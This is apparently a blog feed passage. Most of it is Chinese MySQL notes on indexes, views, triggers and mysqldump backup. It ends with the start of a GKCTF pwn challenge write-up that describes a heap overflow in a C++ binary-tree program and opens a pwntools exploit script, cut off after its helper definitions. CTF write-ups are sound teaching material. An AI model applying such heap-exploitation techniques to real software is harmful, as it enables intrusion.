class="keyword">DESC</span>]);</span><br></pre></td></tr></table></figure><p>例如先创建一个teacher表。然后再创建教师号的唯一索引名为teacher_num。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> teacher(教师号 <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>, 教师姓名 <span class="built_in">varchar</span>(<span class="number">10</span>) <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">NOT</span> <span class="literal">NULL</span>, 性别 enum(<span class="string">'男'</span>,<span class="string">'女'</span>) <span class="built_in">character</span> <span class="keyword">set</span> utf8 <span class="keyword">NOT</span> <span class="literal">NULL</span>,电话 <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>);<span class="comment">#首先创建teacher表</span></span><br><span class="line"><span class="comment">#然后再teacher表中创建教师号的唯一索引。</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> teacher_num <span class="keyword">on</span> teacher(教师号);</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> teacher <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> teacher_num(教师号);</span><br></pre></td></tr></table></figure><p><img src="./image-20220307164617971.png" alt="image-20220307164617971"></p><h4><span id="删除索引">删除索引</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> 表中索引名 <span class="keyword">ON</span> 表名;</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 表名 <span class="keyword">DROP</span> <span class="keyword">INDEX</span> 索引名;</span><br></pre></td></tr></table></figure><p>例如删除刚刚创建的student中的telephone索引。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">INDEX</span> telephone <span class="keyword">on</span> student;</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> teacher <span class="keyword">DROP</span> <span class="keyword">INDEX</span> telephone;</span><br></pre></td></tr></table></figure><p><img src="./image-20220307170905246.png" alt="image-20220307170905246"></p><h4><span id="查看表中索引">查看表中索引</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><p>例如查看test中的索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220307172535973.png" alt="image-20220307172535973"></p><p>查看student表中的索引</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure><p><img src="./image-20220307172708135.png" alt="image-20220307172708135"></p><h3><span id="视图">视图</span></h3><p>视图是一个数据库对象，是一个或多个基表中导出的基表。通过视图访问的数据不作为对路的对象存储在数据库内。视图被定义后便存储在数据库中，通过视图看到的数据只是存放在基表中的数据。通过视图进行数据修改时，相应的基表也会发生变化。若基表的数据发生变化，这种变化也会自动反映在视图中。视图可以时一个基表数据，也可以是多个基表数据的联合，也可以有其他一个或多个视图产生。</p><ul><li>筛选表中记录</li><li>防止未经许可的用户访问敏感数据</li><li>将多个物理数据表抽象为一个逻辑数据表</li></ul><p>视图上的操作和基表类似，但是数据库管理系统对视图的更新操作往往存在一定的限制。数据库管理系统对视图进行的权限管理和基表也有所不同。但是视图可以增强数据的逻辑独立性和安全性。</p><p>视图优点</p><p>视图某种程度上来说只是给查询起了一个名字，把它作为对象保存在数据库中。只要使用简单的select语句即可查看视图中查询的执行结果。对视图的一切操作最终会转换为对基表的操作。</p><ul><li>视图能简化用户操作，使用户可以将注意力集中在自己关心的数据上。</li><li>使用户从多角度看待同一数据</li><li>视图使数据库具备逻辑独立性</li><li>视图能够对机密数据提供安全保护。</li></ul><h4><span id="创建视图">创建视图</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span>|<span class="keyword">REPLACE</span> [ALGORITHM=&#123;UNDEFINED|<span class="keyword">MERGE</span>|TEMPTABLE&#125;] <span class="keyword">VIEW</span> 视图名[(查询字段别名)]  <span class="keyword">as</span> <span class="keyword">sql</span>查询语句 [<span class="keyword">WITH</span> [<span class="keyword">CASCADED</span>|<span class="keyword">LOCAL</span>] <span class="keyword">CHECK</span> <span class="keyword">OPTION</span>]</span><br></pre></td></tr></table></figure><p>在该视图是根据另一个视图定义时，加入with check option语句后，local和cascaded关键字将决定检查测试范围。</p><p>local关键字仅作用在定义的视图上，cascaded关键字会对与该视图相关的所有视图和基表进行检查，默认是cascaded。</p><p>创建视图要求创建者具有针对视图的create view 权限，以及针对 select 语句选择的每一列上的某些权限。</p><p>视图创建默认属于当前数据库，这个与存储过程和函数类似。</p><p>algorithm定义视图所使用的算法,默认使用merge</p><p>merge:一个合并算法，每当执行的时候,先将视图的sql语句与外部查询视图的sql语句,合并在一起,最终执行；</p><p>temptable: 将视图结果放置到临时表中，意味这要mysql要先创建好一个临时表，然后将结果放到临时表中去，然后再使用这个临时表进行相应的查询。</p><p>undefined: 选择所要使用的算法。如果可能，它倾向于MERGE而不是TEMPTABLE，这是因为MERGE通常更有效，而且如果使用了临时表，视图是不可更新的。</p><p><strong>查询字段别名需要与sql查询语句中的查询字段一一对应。</strong></p><p>例如定义一个视图名为high_salary，查询工资大于150000的员工，字段名换为员工编号，薪水，拥有薪水日期，更改薪水日期。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> high_salary(员工编号,薪水,拥有薪水日期,更改薪水日期) <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> salaries <span class="keyword">where</span> salary&gt;<span class="number">150000</span>;</span><br></pre></td></tr></table></figure><p>再查看该视图。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> high_salary;</span><br></pre></td></tr></table></figure><p><img src="./image-20220309162055480.png" alt="image-20220309162055480"></p><p>例如创建一个多表联合的视图，显示最高薪水工资高于150000的员工表，字段名为员工编号，姓氏，姓名，性别，年龄，最高薪水</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> highsalary_info(员工编号,姓氏,姓名,性别,年龄,最高薪水) <span class="keyword">as</span> <span class="keyword">select</span> emp_no,first_name,last_name,gender,<span class="keyword">TIMESTAMPDIFF</span>(<span class="keyword">year</span>,birth_date,<span class="keyword">curdate</span>()),<span class="keyword">max</span>(salary) <span class="keyword">from</span> employees <span class="keyword">natural</span> <span class="keyword">join</span> salaries <span class="keyword">where</span> salary&gt;<span class="number">150000</span> <span class="keyword">group</span> <span class="keyword">by</span> emp_no,first_name,last_name,gender;</span><br></pre></td></tr></table></figure><p><img src="./image-20220309164703793.png" alt="image-20220309164703793"></p><h4><span id="查看视图">查看视图</span></h4><p>查看数据库中已经存在的视图定义，查看视图必须有showview权限。</p><ol><li><pre><code class="sql">desc 视图名<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![<span class="string">image-20220309165349155</span>](<span class="link">./image-20220309165349155.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">2. </span><span class="code">```</span>sql</span><br><span class="line">   show table status like '视图名'\G</span><br></pre></td></tr></table></figure>![image-20220309170458713](./image-20220309170458713.png)</code></pre></li><li><pre><code class="sql"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">view</span> 视图名;<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ![<span class="string">image-20220309170631497</span>](<span class="link">./image-20220309170631497.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">#### 修改视图</span></span><br><span class="line"></span><br><span class="line">可以替换同名的视图,将原始视图改为现在设置的视图。</span><br><span class="line"></span><br><span class="line"><span class="code">```sql</span></span><br><span class="line"><span class="code">ALTER [ALGORITHM=&#123;UNDEFINED|MERGE|TEMPTABLE&#125;] VIEW 视图名[(查询字段别名)]  as sql查询语句 [WITH [CASCADED|LOCAL] CHECK OPTION]</span></span><br></pre></td></tr></table></figure></code></pre></li></ol><p>例如更改high_salary视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">VIEW</span> high_salary <span class="keyword">as</span> <span class="keyword">select</span> emp_no <span class="keyword">from</span> salaries <span class="keyword">where</span> salary&gt;<span class="number">150000</span>;</span><br></pre></td></tr></table></figure><h4><span id="删除视图">删除视图</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> 视图名;</span><br></pre></td></tr></table></figure><p>例如删除high_salary视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> high_salary;</span><br></pre></td></tr></table></figure><h4><span id="更新视图">更新视图</span></h4><p>这里指的是通过视图去更新基表中的数据。</p><h5><span id="插入数据">插入数据</span></h5><ul><li><p>使用insert语句需要进行插入的用户必须有在基表中插入数据的权限，否则插入会失败。</p></li><li><p>如果视图插入字段没有包含基表中所有字段为NOT NULL的字段，则会插入失败。</p></li><li><p>如果视图的数据是由聚合函数或者表达式计算得到的，则插入不成功。</p></li><li><p>不能再使用了DISTINCT、UNION、TOP、GROUP BY、HAVING的视图中插入数据。</p></li><li><p>创建视图中使用了with check option的视图，对视图进行修改必须符合with check option中的限定条件。</p></li><li><p>对于多个基表连接查询的视图来说，一次插入只能作用于一个基表。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> [<span class="keyword">into</span>] 视图名 <span class="keyword">values</span>(视图的各个字段);</span><br></pre></td></tr></table></figure><p>总的来说就是把视图当作一种特殊的表进行插入操作，插入时注意以上条件。</p><p>例如创建一个视图，查询student表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> stu <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> student;</span><br></pre></td></tr></table></figure><p>在视图中插入一条数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> stu <span class="keyword">values</span>(<span class="number">6666</span>,<span class="string">'yyds'</span>,<span class="string">'男'</span>,<span class="string">'111111111'</span>),(<span class="number">7777</span>,<span class="string">'wuhu'</span>,<span class="string">'男'</span>,<span class="string">'22222222'</span>);</span><br></pre></td></tr></table></figure><p><img src="./image-20220309194500975.png" alt="image-20220309194500975"></p><h5><span id="更新数据">更新数据</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> 视图名 <span class="keyword">set</span> 字段名=<span class="string">'字段值'</span> <span class="keyword">where</span> 限制条件;</span><br></pre></td></tr></table></figure><p>例如将上述插入数据yyds的性别改为女</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> stu <span class="keyword">set</span> 性别=<span class="string">'女'</span>  <span class="keyword">where</span> 姓名=<span class="string">'yyds'</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220309194842958.png" alt="image-20220309194842958"></p><h5><span id="删除数据">删除数据</span></h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> [<span class="keyword">from</span>] 视图名 <span class="keyword">where</span> 限制条件;</span><br></pre></td></tr></table></figure><p>例如删除学生姓名为wuhu那一条记录。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> stu <span class="keyword">where</span> 姓名=<span class="string">'wuhu'</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220309195114376.png" alt="image-20220309195114376"></p><h3><span id="触发器">触发器</span></h3><p>触发器定义了一系列操作，这一系列称为触发程序。当触发器所在表上出现了insert、update、delete操作时，将激活触发器。触发器基于一个表创建，但是可以针对多个表进行操作，因此触发器可以用来对表实施复杂的完整性约束。</p><p>触发器优点：</p><ul><li>触发器可以自动执行，当对表进行insert、update、delete操作，试图修改表中数据时，相应触发器立即自动执行。</li><li>触发器可以对数据库中表相关进行层叠更改。</li><li>触发器可以实现表的约束但实现不了复杂的约束。触发器可以引用其他表中字段，从而实现多表之间的复杂约束。</li><li>触发器可以维护冗余数据，实现外键级联。</li></ul><h4><span id="创建触发器">创建触发器</span></h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">TRIGGER</span> 触发器名 <span class="keyword">AFTER</span>/<span class="keyword">BEFORE</span> <span class="keyword">INSERT</span>/<span class="keyword">UPDATE</span>/<span class="keyword">DELETE</span> <span class="keyword">ON</span> 表名 <span class="keyword">for</span> <span class="keyword">EACH</span> <span class="keyword">ROW</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">sql</span>语句<span class="comment">#触发操作</span></span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><ol><li><p>触发器时数据库对象，因此创建触发器时，需要指定该触发器属于哪一个数据库。</p></li><li><p>触发器是在表上创建的。这个表必须时基表，不能是临时表，也不能是视图。</p></li><li><p>触发事件有三种：INSERT、UPDATE、DELETE</p><p>INSERT：将新纪录插入表时激活触发操作</p><p>UPDATE：更新表中数据时激活触发操作</p><p>DELETE：删除表中数据时激活触发操作</p></li><li><p>触发时间有两种：BEFORE和AFTER.BEFORE是在触发时间发生之前激活触发程序，AFTER是在触发事件之后执行触发程序。</p></li><li><p>FOR EACH ROW表示行级触发器。表示数据变动操作影响的每一条记录都会执行一次触发程序。</p></li><li><p>触发程序中的select语句不能产生结果集。</p></li><li><p>触发程序中可以使用OLD和NEW关键字。</p><ul><li>向表中插入新纪录时，在触发程序中可以使用NEW关键字表示记录。当需要访问新纪录中的某个字段时，可以使用”NEW.字段名”进行访问。</li><li>从表中删除某条旧记录时，在触发程序中可以使用OLD关键字表示删除的旧记录。当需要访问删除旧记录中的某个字段时，可以使用’’OLD.字段名”进行访问。</li><li>修改表中字段也是同理</li><li>OLD记录只是只读，在触发程序中只能读取，不能修改。</li><li>在BEFORE触发程序中，可以使用”set NEW.字段名=值”更改NEW记录的值。但是在AFTER触发程序中，不能使用”SET NEW.字段名=值” 更改NEW记录的值。</li><li>对于INSERT操作，只有NEW关键字时合法的。DELETE操作只有OLD关键字时合法的。</li></ul></li></ol><p>例如创建一个触发器tr_delete_info，在删除一个员工信息时,自动删除所有表中有关该员工的信息.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> tr_delete_info <span class="keyword">after</span> <span class="keyword">delete</span> <span class="keyword">on</span> employees <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">set</span> @emp_no=OLD.emp_no;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> salaries <span class="keyword">where</span> emp_no=@emp_no;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> titles <span class="keyword">where</span> emp_no=@emp_no;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> dept_manager <span class="keyword">where</span> emp_no=@emp_no;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> dept_emp <span class="keyword">where</span> emp_no=@emp_no;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220310164205265.png" alt="image-20220310164205265"></p><p>例如创建一个触发器tr_add_info,新增一条员工信息,判断该员工年龄,当年龄大于30岁在title中表中插入记录为Senior Engineer,薪水为80000,分配到 Prouduction.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> tr_add_info <span class="keyword">after</span> <span class="keyword">insert</span> <span class="keyword">on</span> employees <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">DECLARE</span> Ad_dept_no <span class="built_in">char</span>(<span class="number">4</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>;</span><br><span class="line">IF TIMESTAMPDIFF(year,new.birth_date,new.hire_date)&gt;30 then</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> salaries <span class="keyword">values</span>(new.emp_no,<span class="number">80000</span>,new.hire_date,<span class="string">'9999-01-01'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> titles <span class="keyword">values</span>(new.emp_no,<span class="string">'Senior Engineer'</span>,new.hire_date,<span class="string">'9999-01-01'</span>);</span><br><span class="line"><span class="keyword">select</span> dept_no <span class="keyword">into</span> Ad_dept_no <span class="keyword">from</span> departments <span class="keyword">where</span> dept_name <span class="keyword">like</span> <span class="string">'Production'</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> dept_emp <span class="keyword">values</span>(new.emp_no,Ad_dept_no,new.hire_date,<span class="string">'9999-01-01'</span>);</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">if</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220310173215702.png" alt="image-20220310173215702"></p><p>例如创建一个触发器tr_promotion基于dept_manager表,更新数据调整部门manager时,同时在工资记录表中插入一条新的数据来记录新manager的工资,并修改原来记录的to_date字段为升值日,和在dept_manager表中插入一条新的记录,修改原来记录.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> tr_promotion <span class="keyword">after</span> <span class="keyword">update</span> <span class="keyword">on</span> dept_manager <span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">row</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">update</span> salaries <span class="keyword">set</span> <span class="keyword">to_date</span>=new.from_date <span class="keyword">where</span> emp_no=new.emp_no <span class="keyword">and</span> <span class="keyword">to_date</span>=<span class="string">'9999-01-01'</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> salaries <span class="keyword">values</span>(new.emp_no,<span class="number">150000</span>,new.from_date,new.to_date);</span><br><span class="line"><span class="keyword">update</span> titles <span class="keyword">set</span> <span class="keyword">to_date</span>=new.from_date <span class="keyword">where</span> emp_no=new.emp_no <span class="keyword">and</span> <span class="keyword">to_date</span>=<span class="string">'9999-01-01'</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> titles <span class="keyword">values</span>(new.emp_no,<span class="string">'Manager'</span>,new.from_date,new.to_date);</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><p><img src="./image-20220310195157100.png" alt="image-20220310195157100"></p><h4><span id="删除触发器">删除触发器</span></h4><p>与视图类似.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">trigger</span> 触发器名</span><br></pre></td></tr></table></figure><h4><span id="查看触发器">查看触发器</span></h4><p>与视图一样,只需将view改为trigger即可.</p><h2><span id="数据库管理">数据库管理</span></h2><h3><span id="数据备份数据导出">数据备份（数据导出）</span></h3><h4><span id="数据备份的分类">数据备份的分类</span></h4><p>数据库是否在线划分</p><ul><li>热备份。数据库正处于运行状态，此时依赖数据库的日志文件进行备份</li><li>温备份。进行数据备份时数据库服务正常运行，但是数据只能读不能写</li><li>冷备份。数据库处于关闭状态，能够较好地保证数据库的完整性。</li></ul><p>备份内容划分</p><ul><li>逻辑备份。使用软件从数据库中提取数据并将结果写到一个文件上，该文件格式一般与原数据库的文件格式不同，只是源数据库中数据内容的一个映像。</li><li>物理备份。直接复制数据库文件。与逻辑备份相比，其速度较快，但占用空间较大。</li></ul><p>备份数据设计的范围来划分</p><ul><li>完整备份。完整备份指备份整个数据库，这是任何备份策略中都要求完成的第一种备份类型，其他所有备份都依赖于完整备份。</li><li>增量备份。指对数据库从上一次完整备份或者最近一次增量备份改变的内容的备份。</li><li>差异备份。对最近一次完整备份以后发生改变的数据进行备份。</li></ul><p>备份操作如下，备份不需要进入数据库。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u username -h 保存主机 -p 数据库名 [欲备份表名1,欲备份表名2,....] &gt; 备份存储文件名.sql</span><br></pre></td></tr></table></figure><p>例如备份数据库employees</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -h 127.0.0.1 employees -p &gt; employees.sql</span><br></pre></td></tr></table></figure><p><img src="./image-20220311152235219.png" alt="image-20220311152235219"></p><p>mysqldump还提供如下参数，可以通过<code>mysqldump --help</code>自行查看</p><p>​    <em>–all-database</em>:备份所有数据库</p><p>​    <em>–databases dbname</em>:备份某个数据库</p><p>​    <em>–lock-tables</em>:锁定表。</p><p>​    <em>–lock-all-tables</em>:锁定所有的表</p><p>​    <em>–events</em>:备份EVENTS的相关信息</p><p>​    <em>–no-data</em>:只备份DDL语句和表结构，不备份数据。</p><p>​    <em>–master-date=n</em>:备份的同时导出二进制日志文件及其位置。如果n为1，则把信息保存为change master语句。如果n为2，则把信息保存为注释掉的change master语句。</p><p>​    <em>–routines</em>:将存储过程和存储函数备份</p><p>​    <em>–single-transaction</em>:实现热备份</p><p>​    <em>–triggers</em>:备份触发器</p><h3><span id="数据恢复数据导入">数据恢复（数据导入）</span></h3><p>将备份的数据恢复到当前数据库中，也叫导入数据库文件。mysql保证数据安全的方法。</p><p>（1）数据库备份。通过多出数据或者表文件的副本来保护数据。</p><p>（2）二进制日志文件保存更新数据的所有语句。</p><p>（3）数据库复制。mysql的内部复制功能建立在两个或多个服务器之间，是通过设定他们之间的主从关系来实现的。</p><p>同样不需要进入数据库</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u 用户名 -p [数据库名] &lt;数据库备份文件名.sql</span><br></pre></td></tr></table></figure><p>数据库名可以不用指定，如果不指定，则根据sql文件自己创建。如果指定，则会导入相应数据库中，指定数据库不存在则会导入出错。</p><p>例如将<a href="./mysqlsampledatabase.sql">mysqlsample</a>导入到数据库中。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p &lt; mysqlsampledatabase.sql</span><br></pre></td></tr></table></figure><p><img src="./image-20220311155621868.png" alt="image-20220311155621868"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;span id=&quot;mysql数据库笔记&quot;&gt;MYSQL数据库笔记&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;进入MySQL&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=
      
    
    </summary>
    
    
      <category term="数据库" scheme="http://Whali3n51.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="Mysql" scheme="http://Whali3n51.top/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF_pwn出题思路&amp;利用</title>
    <link href="http://whali3n51.top/2020/05/24/GKCTF_Pwn%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-%E5%88%A9%E7%94%A8/"/>
    <id>http://whali3n51.top/2020/05/24/GKCTF_Pwn%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF-%E5%88%A9%E7%94%A8/</id>
    <published>2020-05-24T02:22:46.000Z</published>
    <updated>2020-06-01T04:10:06.541Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="0x01-bts">0x01 BTS</span></h2><h3><span id="出题思路">出题思路：</span></h3><p>该题就是一个用C++写的一个简单的二叉树。因为考虑到时间问题，不想让师傅们在逆向上面花费太多时间，所以就没有去掉符号。该题的漏洞点在Nodeinfo::operator=()这个运算符重载这里。     </p><p><img src="./1.png" alt="img">      </p><p>这里开辟的空间省掉了size/8的余数，所以这里造成了溢出。但是这个漏洞不好触发。回到调用这个函数的地方      </p><p><img src="./2.png" alt="img">      </p><p>这里判断的是左右子树共同存在的情况下，删除根节点，才会触发这个运算符重载，才能利用这里的堆溢出漏洞。虽然漏洞很简单，但是这一题不好利用，前面传递信息的时候，会创造两个临时对象，堆块里面的信息不好控制，最后去篡改指针的时候会有一丢丢难度。附上exp:</p><h3><span id="exploit">exploit:</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, 